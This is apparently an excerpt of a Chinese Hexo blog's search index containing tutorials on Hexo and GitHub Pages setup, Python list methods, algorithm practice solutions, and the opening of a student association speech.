/images/logo.jpg #网站logo，会在浏览器页面标签左上角显示# URL 博客地址,与申请的GitHub一致## If your site is put in a subdirectory, set url as &apos;http://yoursite.com/child&apos; and root as &apos;/child/&apos;url: https://fzy-line.github.io/root: /#博客链接格式permalink: :year/:month/:day/:title/ permalink_defaults:# Directory #目录设置，一般不修改source_dir: source #资源文件夹，放在里面的文件会上传到github中public_dir: public #公共文件夹，存放生成的静态文件tag_dir: tags #标签文件夹，默认是tags。实际存放在source/tags中。archive_dir: archives #档案文件夹，默认是archives。category_dir: categories #分类文件夹，默认是categories。实际存放在source/categories中。code_dir: downloads/code #代码文件夹，默认是downloads/codei18n_dir: :lang #国际化文件夹，默认跟language相同skip_render: #跳过指定文件的渲染，您可使用 glob 来配置路径。# Writing 这是文章布局、写作格式的定义，一般不修改new_post_name: :title.md # File name of new postsdefault_layout: posttitlecase: false # Transform title into titlecaseexternal_link: true # Open external links in new tabfilename_case: 0render_drafts: falsepost_asset_folder: falserelative_link: falsefuture: truehighlight: enable: true line_number: true auto_detect: false tab_replace:# Category &amp; Tag #分类和标签，一般不修改default_category: uncategorizedcategory_map:tag_map:# Date / Time format #日期、时间格式，一般不修改## Hexo uses Moment.js to parse and display date## You can customize the date format as defined in## http://momentjs.com/docs/#/displaying/format/date_format: YYYY-MM-DD time_format: HH:mm:ss# Pagination #可根据自己需要修改## Set per_page to 0 to disable paginationper_page: 6 #分页，每页文章数量pagination_dir: page# Extensions #扩展## Plugins: https://hexo.io/plugins/## Themes: https://hexo.io/themes/theme: next #博客主题 # Deployment 这里配置站点部署到Github，上一节中已经讲过## Docs: https://hexo.io/docs/deployment.htmldeploy: type: git repository: git@github.com:你的Github用户名.github.io.git branch: master hexo使用主题Hexo 安装主题的方式非常简单，只需要将主题文件拷贝至站点目录的 themes 目录下， 然后修改下配置文件即可。 hexo官方主题下载地址：https://hexo.io/themes/，里面有多种多样的主题模板供大家选择。 这里推荐一款很火的主题：next，下面的配置也是以这个主题为例。如果你使用的是其他的主题，那么请你自己根据说明文档进行配置。 next主题的官网，有很详细的配置文档：http://theme-next.iissnan.com/ 下载主题next下载地址：https://github.com/iissnan/hexo-theme-next 到Gtihub下载此主题后解压，打开可以看到里面很多主题相关的文件，我们将此文件夹改名为next，然后将它复制到站点目录的/themes/目录下。 启用主题hexo默认是使用的landscape主题，我们可以在站点目录下的/themes/目录下看到landscape文件夹。 我们的themes文件夹里可以放很多主题的文件夹，但是实际上我们的网站采用哪一个主题，这是需要我们进行配置的，打开编辑全局配置文件，找到下面的内容： 1234# Extensions #扩展## Plugins: https://hexo.io/plugins/## Themes: https://hexo.io/themes/theme: next #博客主题，默认是landscape 在theme字段这里填上你下载的主题的文件夹的名字，例如我们使用next主题就填上next。这样配置文件就和我们的主题文件关联起来了。 配置主题配置文件主题配置文件位于站点目录下的/themes/next/目录下，打开编辑，这里我们只贴出需要修改的地方进行介绍，如下： （1）配置基本信息 1234567891011# 网站图标，将其放在hexo站点/source/目录下favicon: /logo.jpg# 关键词，例如下面是我写的keywords: &quot;Python,Life,Android&quot;# 网站建立时间，显示在页面底部since: 2016# 网站版权声明，显示在页面底部copyright: true （2）选择外观样式 目前 NexT 支持三种 Scheme，他们是： Muse - 默认 Scheme，这是 NexT 最初的版本，黑白主调，大量留白 Mist - Muse 的紧凑版本，整洁有序的单栏外观 Pisces - 双栏 Scheme，小家碧玉似的清新 找到主题配置文件的如下三行，其中#号表示注释，要启用哪一种样式就把#号去掉即可。 1234# Schemes#scheme: Muse#scheme: Mistscheme: Pisces （3）设置菜单 菜单内容的设置格式是：item name: link。其中 item name 是一个名称，这个名称并不直接显示在页面上，它将用于匹配图标以及翻译。 12345678menu: home: / archives: /archives categories: /categories tags: /tags about: /about #sitemap: /sitemap.xml #commonweal: /404.html 此设定格式是 item name: icon name，其中 item name 与上一步所配置的菜单名字对应，icon name 是 Font Awesome 图标的 名字。而 enable 可用于控制是否显示图标，你可以设置成 false 来去掉图标。 1234567891011menu_icons: enable: true #KeyMapsToMenuItemKey: NameOfTheIconFromFontAwesome home: home about: user categories: th schedule: calendar tags: tags archives: archive sitemap: sitemap commonweal: heartbeat 测试配置效果123$ hexo clean #用于清除缓存$ hexo generate #生成静态网页$ hexo server #开启本地预览 访问：http://localhost:4000/ 查看效果，如下图： 解决遇到的问题到这里会发现点击左侧菜单的分类、标签和关于会提示找不到页面。 这是因为我们只是创建了菜单，还没有创建相应的页面。 新建页面的hexo命令是： 1$ hexo new page &quot;pageName&quot; 我们新建分类、标签、关于页面： 1$ hexo new page &apos;categories&apos; 1$ hexo new page &apos;tags&apos; 1$ hexo new page &apos;about&apos; 分别执行完这三条命令后，我们会发现站点目录下的/source/目录下多了三个文件夹：categories，tags，about，每个文件夹里面都会生成一个index.md文件，如下： 默认都只会生成title和date字段，我们要为其添加上type字段，并赋值。 注意：博客文章的抬头信息中每个字段后面的冒号是英文格式的，而且其后要加一个空格再写值 categories下的index.md： 12345---title: categoriesdate: 2016-12-02 23:28:27type: categories--- tags下的index.md： 12345---title: tagsdate: 2016-12-02 23:31:23type: tags--- about下的index.md： 12345---title: aboutdate: 2016-12-02 23:31:23type: about--- 这样我们的这几个页面也就没有问题了。至此，基本的配置也就完成了，接下来介绍如何写博客与发布博客。 发布博客新建博客文章1$ hexo new &quot;postName&quot; #新建文章 实例： 新建博客《我的第一篇博客》 1$ hexo new &quot;我的第一篇博客&quot; 到站点目录下的/source/_posts/目录下可以看到生成了名为：我的第一篇博客.md的文件，这是Markdown格式的文件，可以用sublime text3或者notepad++等编辑器打开，也可以下载一个MarkdownPad来编辑Markdown文件。 Markdown是一种可以使用普通文本编辑器编写的标记语言，通过简单的标记语法，它可以使普通文本内容具有一定的格式。 如果你没有使用过Markdown编辑器，那请你自己去学习一下Markdown语法。 Markdown 语法说明(简体中文版)：http://www.appinn.com/markdown/ 编辑博客Hexo默认新建的文章抬头已有title、date、tags等属性，可能缺乏categories和meta标签，想要指定目录就需要添加categories属性，而meta标签则是为了便于搜索引擎的收录。如下： 12345---title: 我的第一篇博客date: 2016-12-02 23:44:20tags: #文章标签 可以省略--- tags字段是文章的标签，可以指定标签也可以不指定，如果要指定多个标签需要这样做： 1tags: [Linux,Http,网络] 我们可以添加上categories字段，对博客进行分类管理，然后点击主页左侧菜单的分类就可看到具体的分类。例如： 1categories: Linux 如何实现上图的阅读全文功能？ 在自己喜欢的位置添加一个：1&lt;!--more--&gt; 即可，主题会自动识别这个标签，生成对应的阅读全文按钮。 123以上是文章摘要&lt;!--more--&gt;以下是余下全文 发布博客1$ hexo clean #清除缓存 网页正常情况下可以忽略此条命令 1$ hexo generate #生成静态页面至public目录 写好之后可以现在本地预览，确定无误之后再部署到Github上。 1$ hexo server #开启预览访问端口（默认端口4000，&apos;ctrl + c&apos;关闭server） 1$ hexo deploy #将.deploy目录部署到GitHub 需要说明的是： 我们博客文章的编写都是Markdown文件，但是发布到github上的其实是html文件，将Markdown转换成html这个工作我们只要输入hexo generate命令即可，hexo会帮我们完成转换。 hexo命令简写形式1234hexo n &quot;我的博客&quot; == hexo new &quot;我的博客&quot;hexo g == hexo generatehexo s == hexo serverhexo d == hexo deploy 下一篇博客主要讲解如何优化next主题，使用主题提供的一些第三方功能。]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
        <tag>Github</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python序列详解-列表]]></title>
    <url>%2F2016%2F12%2F01%2FPython%E5%BA%8F%E5%88%97%E8%AF%A6%E8%A7%A3-%E5%88%97%E8%A1%A8%2F</url>
    <content type="text"><![CDATA[基本介绍 列表是最常用的Python数据类型。 列表是可变的。 列表的数据项不需要具有相同的类型。 列表用[]符号或list()创建。 基本的列表操作list函数将序列转换成列表。 12&gt;&gt;&gt; list(&apos;Hunau&apos;)[&apos;H&apos;, &apos;u&apos;, &apos;n&apos;, &apos;a&apos;, &apos;u&apos;] list函数适用于所有类型的序列，而不只是字符串。 赋值使用列表的索引标记来为某个特定的、位置明确的元素赋值。 1234&gt;&gt;&gt; lst = [1,2,3]&gt;&gt;&gt; lst[2] = 4&gt;&gt;&gt; lst[1, 2, 4] 不能为一个位置不存在的元素进行赋值。 分片赋值（1）通过分片赋值进行替换 可以一次为多个元素赋值，并且使用与原序列不等长的序列将分片替换： 1234567&gt;&gt;&gt; lst = [1, 2, 3, 4]&gt;&gt;&gt; lst[1:3] = list(&apos;xx&apos;) #等长替换&gt;&gt;&gt; lst[1, &apos;x&apos;, &apos;x&apos;, 4]&gt;&gt;&gt; lst[1:] = list(&apos;python&apos;) #不等长替换&gt;&gt;&gt; lst[1, &apos;p&apos;, &apos;y&apos;, &apos;t&apos;, &apos;h&apos;, &apos;o&apos;, &apos;n&apos;] （2）通过分片赋值进行插入 可以在不替换任何原有元素的情况下插入新的元素： 1234&gt;&gt;&gt; lst = [1,6]&gt;&gt;&gt; lst[1:1] = [2, 3, 4, 5]&gt;&gt;&gt; lst[1, 2, 3, 4, 5, 6] （3）通过分片赋值进行删除 1234&gt;&gt;&gt; lst = [1, 2, 3, 4, 5, 6]&gt;&gt;&gt; lst[1:5] = []&gt;&gt;&gt; lst[1, 6] 删除元素有个方法可以从列表中按给定的索引而不是值来删除一个子项：del 语句。 语句del还可以从列表中删除切片或清空整个列表. 12345678910&gt;&gt;&gt; lst = [1,2,3,4,5,6,7,8]&gt;&gt;&gt; del lst[1] #删除一个元素&gt;&gt;&gt; lst[1, 3, 4, 5, 6, 7, 8]&gt;&gt;&gt; del lst[0:2] #借助分片删除多个元素&gt;&gt;&gt; lst[4, 5, 6, 7, 8]&gt;&gt;&gt; del lst[:] #删除列表的所有元素&gt;&gt;&gt; lst[] del也可以用来删除整个变量！ 列表对象方法append把一个元素添加到列表的结尾，相当于 a[len(a):] = [x]。它是直接修改列表，而不是返回一个新的列表。 1234&gt;&gt;&gt; lst = [1,2,&apos;x&apos;,&apos;y&apos;]&gt;&gt;&gt; lst.append(3)&gt;&gt;&gt; lst[1, 2, &apos;x&apos;, &apos;y&apos;, 3] extend将一个给定列表中的所有元素都添加到另一个列表中，相当于 a[len(a):] = L 。 12345&gt;&gt;&gt; a = [1,2,3]&gt;&gt;&gt; b = [4,5,6]&gt;&gt;&gt; a.extend(b)&gt;&gt;&gt; a[1, 2, 3, 4, 5, 6] 对比连接操作： 1234&gt;&gt;&gt; a = [1,2,3]&gt;&gt;&gt; b = [4,5,6]&gt;&gt;&gt; a + b[1, 2, 3, 4, 5, 6] 看似两种方法得到的结果一样，实则不然。extend与连接操作最大的区别在于：extend方法修改了被扩展的序列（即上例中的a列表），而使用+号进行连接操作则会返回一个新的列表。 insert在指定位置插入一个元素。第一个参数是准备插入到其前面的那个元素的索引，例如 lst.insert(0, x) 会插入到整个列表之前，而 lst.insert(len(lst), x) 相当于lst.append(x)。 1234567&gt;&gt;&gt; lst = [2,4]&gt;&gt;&gt; lst.insert(0,1)&gt;&gt;&gt; lst[1, 2, 4]&gt;&gt;&gt; lst.insert(3,5)&gt;&gt;&gt; lst[1, 2, 4, 5] count统计某个元素在列表中出现的次数。 1234567&gt;&gt;&gt; lst = [1,2,1,&apos;x&apos;,&apos;x&apos;,[&apos;z&apos;,&apos;y&apos;],[&apos;z&apos;,&apos;y&apos;]]&gt;&gt;&gt; lst.count(1)2&gt;&gt;&gt; lst.count(&apos;x&apos;)2&gt;&gt;&gt; lst.count([&apos;z&apos;,&apos;y&apos;])2 remove删除列表中值为 x 的第一个元素。如果没有这样的元素，就会返回一个错误。 1234&gt;&gt;&gt; lst = [1, 2, &apos;z&apos;, &apos;y&apos;, &apos;z&apos;]&gt;&gt;&gt; lst.remove(&apos;z&apos;)&gt;&gt;&gt; lst[1, 2, &apos;y&apos;, &apos;z&apos;] index返回列表中第一个值为x的元素的索引。如果没有匹配的元素就会返回一个错误。 123&gt;&gt;&gt; lst = [1, 2, &apos;z&apos;, &apos;y&apos;, &apos;z&apos;]&gt;&gt;&gt; lst.index(&apos;z&apos;)2 pop从列表的指定位置删除元素，并将其返回。如果没有指定索引，pop() 返回最后一个元素。元素随即从列表中被删除。 12345&gt;&gt;&gt; lst = [1,2,3]&gt;&gt;&gt; lst.pop()3&gt;&gt;&gt; lst[1, 2] 把列表当作堆栈使用 用 append() 方法可以把一个元素添加到堆栈顶。用不指定索引的 pop() 方法可以把一个元素从堆栈顶释放出来。 123456789&gt;&gt;&gt; stack = [1,2]&gt;&gt;&gt; stack.append(3)&gt;&gt;&gt; stack.append(4)&gt;&gt;&gt; stack.pop()4&gt;&gt;&gt; stack.pop()3&gt;&gt;&gt; stack[1, 2] reverse就地倒排列表中的元素。该方法直接修改列表，而不返回值。 1234&gt;&gt;&gt; lst = [1,2,3,4]&gt;&gt;&gt; lst.reverse()&gt;&gt;&gt; lst[4, 3, 2, 1] sort在原位置对列表中的元素就地进行排序。 1234&gt;&gt;&gt; lst = [2,1,5,3,4]&gt;&gt;&gt; lst.sort()&gt;&gt;&gt; lst[1, 2, 3, 4, 5] 在原位置排序意味着改变原来的列表，而不是返回一个已排序的列表副本。以下操作是错误的： 1234&gt;&gt;&gt; lst = [2, 1, 5, 4, 3]&gt;&gt;&gt; x = lst.sort() #这样做是错误的&gt;&gt;&gt; print xNone 因为sort方法修改了lst列表，然后返回了空值，所以x的值为None。 可以用sorted()方法来获得已排序的列表副本 123456&gt;&gt;&gt; lst = [2, 1, 5, 4, 3]&gt;&gt;&gt; x = sorted(lst)&gt;&gt;&gt; lst[2, 1, 5, 4, 3]&gt;&gt;&gt; x[1, 2, 3, 4, 5] sorted()方法可以用在任何数据类型的序列中，返回的总是一个列表形式： 12&gt;&gt;&gt; sorted(&apos;python&apos;)[&apos;h&apos;, &apos;n&apos;, &apos;o&apos;, &apos;p&apos;, &apos;t&apos;, &apos;y&apos;] 高级排序sort函数是list类的一个方法，其中，包含三个参数cmp，key，reverse：cmp用于指定排序的大小比较算法；key用于制定排序的维度和优先级别；reverse说明是否是逆序排列（True表示从大到小）. 参数reverse1234567891011&gt;&gt;&gt; lst = [1, 5, 3, 2, 4]&gt;&gt;&gt; sorted(lst) #默认升序[1, 2, 3, 4, 5]&gt;&gt;&gt; sorted(lst, reverse = True) #降序排列[5, 4, 3, 2, 1]&gt;&gt;&gt; lst.sort()&gt;&gt;&gt; lst[1, 2, 3, 4, 5]&gt;&gt;&gt; lst.sort(reverse = True)&gt;&gt;&gt; lst[5, 4, 3, 2, 1] 参数key按字符串长度排序 123456&gt;&gt;&gt; lst = [&apos;c&apos;, &apos;java&apos;, &apos;python&apos;,&apos;c++&apos;]&gt;&gt;&gt; sorted(lst, key = len) [&apos;c&apos;, &apos;c++&apos;, &apos;java&apos;, &apos;python&apos;]&gt;&gt;&gt; lst.sort(key = len)&gt;&gt;&gt; lst[&apos;c&apos;, &apos;c++&apos;, &apos;java&apos;, &apos;python&apos;] 将列表中的每个元素变为小写，再按每个元素中的每个字母的ascii码从小到大排序 123456&gt;&gt;&gt; lst = [&apos;zZ&apos;,&apos;bb&apos;,&apos;XX&apos;,&apos;Aa&apos;]&gt;&gt;&gt; sorted(lst, key = str.lower)[&apos;Aa&apos;, &apos;bb&apos;, &apos;XX&apos;, &apos;zZ&apos;]&gt;&gt;&gt; lst.sort(key = str.lower)&gt;&gt;&gt; lst[&apos;Aa&apos;, &apos;bb&apos;, &apos;XX&apos;, &apos;zZ&apos;] 按自定义函数排序 12345&gt;&gt;&gt; def lastChar(s): return s[-1] &gt;&gt;&gt; lst = [&apos;abc&apos;,&apos;b&apos;,&apos;AAz&apos;,&apos;ef&apos;] &gt;&gt;&gt; sorted(lst, key = lastChar) ##按列表e中每个元素的最后一个字母的ascii码从小到大排序[&apos;b&apos;, &apos;abc&apos;, &apos;ef&apos;, &apos;AAz&apos;] 按字典属性排序 12345&gt;&gt;&gt; lst = [&#123;&apos;name&apos;:&apos;fzy&apos;,&apos;age&apos;:20&#125;,&#123;&apos;name&apos;:&apos;xxx&apos;,&apos;age&apos;:30&#125;,&#123;&apos;name&apos;:&apos;yyy&apos;,&apos;age&apos;:25&#125;] #列表中的元素为字典 &gt;&gt;&gt; def age(s): return s[&apos;age&apos;] &gt;&gt;&gt; sorted(lst,key = age) #自定义函数按列表f中字典的age从小到大排序 [&#123;&apos;age&apos;: 20, &apos;name&apos;: &apos;fzy&apos;&#125;, &#123;&apos;age&apos;: 25, &apos;name&apos;: &apos;yyy&apos;&#125;, &#123;&apos;age&apos;: 30, &apos;name&apos;: &apos;xxx&apos;&#125;]]]></content>
      <categories>
        <category>Programming language</category>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>列表</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Github Pages + Hexo搭建博客（一）]]></title>
    <url>%2F2016%2F11%2F30%2FGithub-Pages-Hexo%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%EF%BC%88%E4%B8%80%EF%BC%89%2F</url>
    <content type="text"><![CDATA[写在前面的话阮一峰说过，喜欢写Blog的人，会经历三个阶段。 （1）第一阶段，刚接触Blog，觉得很新鲜，试着选择一个免费空间来写。 （2）第二阶段，发现免费空间限制太多，就自己购买域名和空间，搭建独立博客。 （3）第三阶段，觉得独立博客的管理太麻烦，最好在保留控制权的前提下，让别人来管，自己只负责写文章。 我自己就是从一开始在CSDN写，后来租用阿里云的服务器，用WordPress搭建自己的博客，再到现在整体搬迁到Github上来，整个过程是一种锻炼，也是一种成长。 GitHub Pages是什么？GitHub Pages本用于介绍托管在GitHub的项目， 不过，由于他的空间免费稳定，用来做搭建一个博客再好不过了。 为什么选择GitHub Pages？ GitHub Pages有300M免费空间，搭建的博客可以很方便的进行管理，并且保存可靠； GitHub 是趋势，GitHub上面有很多大牛，学IT的人应该尽早融入这样的环境， 程序员应该学会使用Git来管理项目，熟悉版本控制。 Github上有很多的开源项目，多学习学习，眼界会开阔很多； 接下来应该怎么做？Hexo 是一个简单地、轻量地、基于Node的一个静态博客框架，可以方便的生成静态网页托管在github。我们要使用Github Pages + Hexo搭建博客站点，就必须注册Github账号，安装git、node.js以及hexo等，接下来就一起来实践吧！ Github注册与配置注册如果你还没有自己的Github账号，那请到Github官网注册账号：https://github.com/ 注册成功后github会发送验证邮件到你的邮箱，请查收邮件并进行验证。 新建版本库注册完成后，点击Start a project来新建一个版本库 如果你已经注册，则在自己的主页，点击”New repository”，即可新建一个版本库 输入Repository name:yourname.github.io(yourname与你的注册用户名一致,这个就是你博客的域名了) 启用GitHub Page进入版本库后，点击右上方的setting 下来到Githubs pages栏目，点击Launch automatic page generator 来到New user site页面后点击右下角的Continue to layouts 最后点击”Publish page”,发布github默认生成的一个静态站点 至此，我们已经配置好了github默认的静态站点，并且可以访问：你的github用户名.github.io测试我们刚刚建立好的站点主页。 下载并安装Git下载根据自己电脑操作系统的位数到git官网下载相应的版本： https://git-scm.com/download/win 安装根据自己的需要安装到相应的路径下，其他的一路点击next即可 配置环境变量选中桌面图标计算机，右键选择属性，打开左边的高级系统设置，打开弹出窗口的环境变量，找到path进行编辑。 找到git的安装目录，将其复制后粘贴到path后面。注意每一个加进来的路径后面都要带英文格式的分号。 安装与配置过程可参考图文教程：git的安装和配置 测试是否安装成功windows+R输入cmd打开命令提示符窗口，输入如下命令： 1git --version 若安装成功会打印出本机安装的git的版本。 添加SSH KEY到GithubSSH Key是一个认证，让github识别绑定这台机器，允许这台机器提交。 （1）检查本机是否有SSH KEY设置 打开git bash，输入cd ~/.ssh 或cd .ssh 如果没有则提示： No such file or directory 如果有则进入~/.ssh路径下（ls查看当前路径文件，rm * 删除所有文件） （2）配置生成SSH KEY 12345678910$ cd ~ #保证当前路径在”~”下$ ssh-keygen -t rsa -C &quot;这里填写你的邮箱地址&quot;Generating public/private rsa key pair.Enter file in which to save the key (/c/Users/xxxx_000/.ssh/id_rsa): #不填直接回车Enter passphrase (empty for no passphrase): #输入密码（可以为空）Enter same passphrase again: #再次确认密码（可以为空）Your identification has been saved in /c/Users/xxxx_000/.ssh/id_rsa. #生成的密钥Your public key has been saved in /c/Users/xxxx_000/.ssh/id_rsa.pub. #生成的公钥The key fingerprint is:e3:51:33:xx:xx:xx:xx:xxx:61:28:83:e2:81 xxxxxx@yy.com 至此，已经生成ssh key，其存放路径为：c:/Users/你电脑的用户名/.ssh/下。 注释：可生成ssh key自定义名称的密钥，默认id_rsa。 （3）复制SSH KEY到Github 到C盘你的用户目录下找到.ssh文件夹，查看里面是否有id_rsa和id_rsa.pub这两个文件。 登录GitHub系统；点击右上角账号头像的“▼”→Settings→SSH kyes→Add SSH key，Title自定义，复制id_rsa.pub的公钥内容到GitHub中Add an SSH key的key输入框，最后“Add Key”。 （4）配置账户 123$ git config --global user.name “your_username” #设置用户名$ git config --global user.email “your_registered_github_Email” #设置邮箱地址(建议用注册giuhub的邮箱) （5）测试SSH KEY是否设置成功 1$ ssh -T git@github.com 接下来会返回一些信息，并需要你输入一次yes，若生成ssh key时设置有密码则还会让你输入生成ssh key时设置的密码。 Hi xxx! You’ve successfully authenticated, but GitHub does not provide shell access. #出现词句话，说明设置成功。 SSH-KEY的生成与配置可参考图文教程window下配置SSH连接GitHub、GitHub配置ssh key： 下载并安装node.js下载根据自己电脑操作系统的位数到git官网下载相应的版本： https://nodejs.org/en/download/ 安装根据自己的需要安装到响应的地方，其他的一路点击next即可 配置环境变量选中桌面图标计算机，右键选择属性，打开左边的高级系统设置，打开弹出窗口的环境变量，找到path进行编辑。 找到node.js的安装目录，将其复制后粘贴到path后面。注意每一个加进来的路径后面都要带英文格式的分号。 测试是否安装成功windows+R输入cmd打开命令提示符窗口，输入如下命令： 1node -v 若安装成功会打印出本机安装的node.js的版本。 安装和配置hexohexo是基于node.js的静态博客，官网也是搭建在GitHub上。 安装在你喜欢的路径下新建一个文件夹blog，用来存放博客的文件，在此文件夹中右键打开Git Bash 输入如下指令进行安装： 1$ npm install -g hexo-cli 如果执行这条命令时长时间未成功，那么请先使用下面的命令将npm镜像源更改为国内的镜像，再执行上面的安装命令，因为国外的镜像源很有可能被墙了。1npm config set registry https://registry.npm.taobao.org 初始化hexo1$ hexo init hexo 这里会将Github上的hexo项目clone下来，得到hexo文件夹。 初始化成功后会在最后打印一行：INFO Start blogging with Hexo! 安装依赖文件进入到hexo文件夹 1$ cd hexo 安装依赖文件： 1$ npm install 部署形成文件：1$ hexo generate 本地测试 1$ hexo server 在浏览器输入：http://localhost:4000/ 即可访问到我们搭建好的hexo站点。 将本地hexo项目托管到Github修改全局配置文件_config.yml说明： hexo文件夹下一个_config.yml，我们称之为全局配置文件，在每个主题文件夹内还会有一个_config.yml文件，我们称之为主题配置文件。 用sublime text3或者notepad++等编辑器打开hexo文件夹下的_config.yml文件。 注意：配置文件中每个字段后面的冒号是英文格式的，且在其后要加一个空格再写值 编辑最后面的deploy属性，加入代码： 123type: gitrepository: https://github.com/你的Github用户名/你的Github用户名.github.io.gitbranch: master type使用是git。 repository属性改成你的刚才创建仓库git地址。 分支branch填写master。 安装hexo-deployer-git插件1$ npm install hexo-deployer-git --save 部署到Github上依次执行以下三条命令： 1$ hexo clean #清除缓存 网页正常情况下可以忽略此条命令 1$ hexo generator #生成静态页面至public目录 1$ hexo deploy #将.deploy目录部署到GitHub 执行hexo deploy命令之后，如果最后一行打印出如下信息则表示部署成功 1INFO Deploy done: git 然后你再去访问你创建的Github pages地址，也就是：你的Github用户名.github.io，即可看到你本地的hexo项目已经被部署到github上去了。此时博客的默认主题是landscape，即上面本地测试时的样子。 此篇博客就讲解到这里，下一篇博客主要讲解hexo主题的配置。]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
        <tag>Github</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[算法学习-刷题(八)]]></title>
    <url>%2F2016%2F11%2F06%2F%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0-%E5%88%B7%E9%A2%98-%E5%85%AB%2F</url>
    <content type="text"><![CDATA[二维数组中查找整数牛客网在线编程：剑指Offer第1题 题目描述在一个二维数组中，每一行都按照从左到右递增的顺序排序，每一列都按照从上到下递增的顺序排序。请完成一个函数，输入这样的一个二维数组和一个整数，判断数组中是否含有该整数。 解法一12345public class Solution &#123; public boolean Find(int [][] array,int target) &#123; for(int i = 0;i &lt; array[0].size()) &#125;&#125; 解法二把每一行看成有序递增的数组，利用二分查找，通过遍历每一行得到答案，时间复杂度是nlogn。 12345678910111213141516171819public class Solution &#123; public boolean Find(int [][] array,int target) &#123; for(int i=0;i&lt;array.length;i++)&#123; int low=0; int high=array[i].length-1; while(low&lt;=high)&#123; int mid=(low+high)/2; if(target&gt;array[i][mid]) low=mid+1; else if(target&lt;array[i][mid]) high=mid-1; else return true; &#125; &#125; return false; &#125;&#125; 解法三利用二维数组由上到下，由左到右递增的规律，那么选取右上角或者左下角的元素a[row][col]与target进行比较，当target小于元素a[row][col]时，那么target必定在元素a所在行的左边,即col–；当target大于元素a[row][col]时，那么target必定在元素a所在列的下边,即row++； 123456789101112131415public class Solution &#123; public boolean Find(int [][] array,int target) &#123; int row=0; int col=array[0].length-1; while(row&lt;=array.length-1&amp;&amp;col&gt;=0)&#123; if(target==array[row][col]) return true; else if(target&gt;array[row][col]) row++; else col--; &#125; return false; &#125;&#125; myPowLeetCode第2题 题目描述Implement pow(x, n). Subscribe to see which companies asked this question 解法一用递归方法求n个x的乘积，注意考虑n的正负号，时间复杂度为O(n)。 Leetcode提交超时的代码： 1234567double myPow(double x, int n) &#123; if(n==0) return 1.0; if(n&lt;0) return 1.0/myPow(x,-n); return x*myPow(x,n-1);&#125; 解法二考虑到n个x相乘式子的对称关系，可采用如下方法： Leetcode AC的代码： 12345678910double myPow(double x, int n) &#123; if(n==0) return 1.0; if(n % 2 == 0) &#123; return myPow(x * x, n / 2); &#125; else &#123; return (n &gt; 0 ? x : 1.0 / x ) * myPow(x * x, n / 2) ; &#125; &#125; 3、Reverse Integer LeetCode第7题 题目描述： Reverse digits of an integer. Example1: x = 123, return 321Example2: x = -123, return -321 一般的思路反转整数，只要从低位开始依次取得整数的各个位，然后再按顺序整合成整数即可。 12345678int reverse(int x) &#123; int num = 0; while(x)&#123; num = num*10 + x%10; x = x/10; &#125; return num;&#125; 但是，此题特别要考虑结果溢出的问题！ LeetcodeAC的代码1234567891011int reverse(int x) &#123; int num = 0,tmp; while(x)&#123; tmp = num; num = num*10 + x%10; if((num-x%10)/10 != tmp) //判断是否溢出 return 0; x = x/10; &#125; return num;&#125; 计算字符个数牛客网华为机试在线训练第2题 题目描述写出一个程序，接受一个有字母和数字以及空格组成的字符串，和一个字符，然后输出输入字符串中含有该字符的个数。不区分大小写。 输入一个有字母和数字以及空格组成的字符串，和一个字符。 输出输入字符串中含有该字符的个数。 输入例子:ABCDEFA 输出例子:1 此题十分简单，遍历字符串，将目标字符与字符串的每个字符进行比较，相等则计数加1，当然，要注意的是题目中给出的不区分大小写以及获取输入的方法。 牛客网AC的代码123456789101112131415161718192021#include&lt;stdio.h&gt;#include&lt;string.h&gt;int main()&#123; int i,len=0,cnt=0; char str[1000],c; gets(str); scanf(&quot;%c&quot;,&amp;c); if(c&gt;=65&amp;&amp;c&lt;=90) //目标字符如果是字母则转换成小写 c+=32; len = strlen(str); for(i=0;i&lt;len;i++)&#123; if(str[i]&gt;=65&amp;&amp;str[i]&lt;=90) //字符串中的字符如果是字母则统一转换成小写 str[i]+=32; if(str[i]==c)&#123; //进行比较 cnt++; &#125; &#125; printf(&quot;%d&quot;,cnt); return 0;&#125;]]></content>
      <categories>
        <category>Algorithm</category>
      </categories>
      <tags>
        <tag>算法学习</tag>
        <tag>LeetCode</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[第三届电子协会成立大会发言]]></title>
    <url>%2F2016%2F10%2F23%2F%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%94%B5%E5%AD%90%E5%8D%8F%E4%BC%9A%E6%88%90%E7%AB%8B%E5%A4%A7%E4%BC%9A%E5%8F%91%E8%A8%80%2F</url>
    <content type="text"><![CDATA[时光飞逝，电子协会已经走到第三届，作为协会创办和发展的见证者，很高兴看到协会现在的样子，希望协会能够在第三届的带领下越办越好，也希望大家能够将协会的精神一届届地传承下去。我也很荣幸能够受邀作为第二届电子协会的代表在第三届成立大会上发言，以下是发言稿正文。 尊敬的各位领导、老师，亲爱的同学们，大家晚上好，我是13级信息工程3班的樊振宇，很荣幸能够作为第二届电子协会的代表在这里发言。时光飞逝，转眼一年又过去了，依稀记得第二届电子协会成立大会的场景，去年的成立大会比较简短，今年呢，我们第三届的理事们精心准备，付出了很多，所以也希望我能和大家多分享一点。其实呢，作为协会和实验室的老学长，我对这里已经有很深的感情，所以确实也有很多话想要和大家说。 首先，欢迎各位学弟学妹们加入电子协会这个大家庭，也祝贺第三届电子协会在今天成立。我自己是在大一下学期通过学院的实验室宣讲进入了电子设计创新实验室，那个时候电子协会还没有成立。刚进实验室的时候是12级电信2班的欧超学长带的我，他给我提供了很多帮助，也教会了我一些基本的技术，所以我一直也很感谢他。在这个实验室我不仅可以得到丰富的学习资源，还有热情的学长学姐们的指导和帮助，我当时就觉得这就是我理想的实验室。直到14年10月的时候，在实验室几位学长学姐的倡导下，成立了电子协会，成立的初衷也是积聚更多的电子人才，为实验室的发展打下良好的基础，因此，电子协会和电子设计创新实验室是一个有机的整体。 